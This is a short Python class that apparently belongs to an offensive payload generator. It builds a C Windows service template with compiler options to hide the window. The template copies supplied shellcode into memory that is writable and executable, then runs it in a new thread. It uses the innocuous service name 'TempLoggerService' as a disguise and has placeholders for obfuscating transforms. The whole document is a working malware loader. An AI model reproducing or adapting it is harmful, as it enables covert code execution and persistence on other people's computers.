class service:

    def imports(self) -> list[str]:
        return ["#include <windows.h>", 
                "#include <stdio.h>"]

    def compilerOptions(self) -> list[str]:
        return ['-municode', 
                '-mwindows']

    def template(self) -> str:
        return """
{imports}


SERVICE_STATUS ServiceStatus;
SERVICE_STATUS_HANDLE ServiceStatusHandle;

void ServiceControlHandler(DWORD control) {{
	switch (control) {{
		case SERVICE_CONTROL_PAUSE:
			ServiceStatus.dwCurrentState = SERVICE_PAUSED;
			break;
		case SERVICE_CONTROL_CONTINUE:
			ServiceStatus.dwCurrentState = SERVICE_RUNNING;
			break;
		case SERVICE_CONTROL_STOP:
		case SERVICE_CONTROL_SHUTDOWN:
			ServiceStatus.dwCurrentState = SERVICE_STOPPED;
			break;
	}}
	SetServiceStatus(ServiceStatusHandle, &ServiceStatus);
}}

{codeblocks}

void runShellcode(){{

    
    {transformers}

    LPVOID buffer = NULL;
    HANDLE hThread = NULL;
    
    buffer = VirtualAlloc(NULL, {shellcodeSize}, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(buffer, shellcode, {shellcodeSize});
    
    hThread = CreateThread(NULL, 0, buffer, NULL, 0, NULL);

}}

void ServiceMain(DWORD argc, LPWSTR *argv) {{
	// Setup service
	ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
	ServiceStatus.dwCurrentState = SERVICE_RUNNING;
	ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_PAUSE_CONTINUE | SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
	ServiceStatus.dwWin32ExitCode = NO_ERROR ;
	ServiceStatus.dwServiceSpecificExitCode = 0;
	ServiceStatus.dwCheckPoint = 0;
	ServiceStatus.dwWaitHint = 0;

	ServiceStatusHandle = RegisterServiceCtrlHandler(L"TempLoggerService", ServiceControlHandler);
	if (ServiceStatusHandle == 0)
		return;

	if (SetServiceStatus(ServiceStatusHandle, &ServiceStatus) == 0)
		return;
	
    runShellcode();

	// Service main loop
	while (ServiceStatus.dwCurrentState != SERVICE_STOPPED) {{
		if (ServiceStatus.dwCurrentState == SERVICE_RUNNING)
            Sleep(5000);
	}}
}}

int wWinMain(HINSTANCE instance, HINSTANCE previnstance, LPWSTR cmdline, int showcmd) {{
	SERVICE_TABLE_ENTRY StartTable[] = {{ {{L"TempLoggerService", ServiceMain}}, {{NULL, NULL}} }};
	StartServiceCtrlDispatcher(StartTable);
	return 0;
}}
"""